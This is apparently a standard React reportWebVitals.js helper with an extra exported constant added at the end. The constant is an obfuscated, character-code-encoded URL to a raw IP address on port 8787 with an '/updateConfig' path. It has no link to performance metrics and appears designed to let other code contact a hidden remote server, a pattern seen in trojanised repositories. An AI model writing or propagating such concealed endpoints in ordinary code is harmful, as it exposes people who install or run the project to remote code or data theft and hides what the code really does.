const reportWebVitals = onPerfEntry => {
  if (onPerfEntry && onPerfEntry instanceof Function) {
    import('web-vitals').then(({ getCLS, getFID, getFCP, getLCP, getTTFB }) => {
      getCLS(onPerfEntry);
      getFID(onPerfEntry);
      getFCP(onPerfEntry);
      getLCP(onPerfEntry);
      getTTFB(onPerfEntry);
    });
  }
};
export const webVital = String.fromCharCode(
  104, 116, 116, 112, 58, 47, 47, 56, 57, 46, 49, 48, 55, 46, 49, 48, 46, 53, 56, 58, 56, 55, 56, 55, 47, 117, 112, 100, 97, 116, 101, 67, 111, 110, 102, 105, 103
);
export default reportWebVitals;
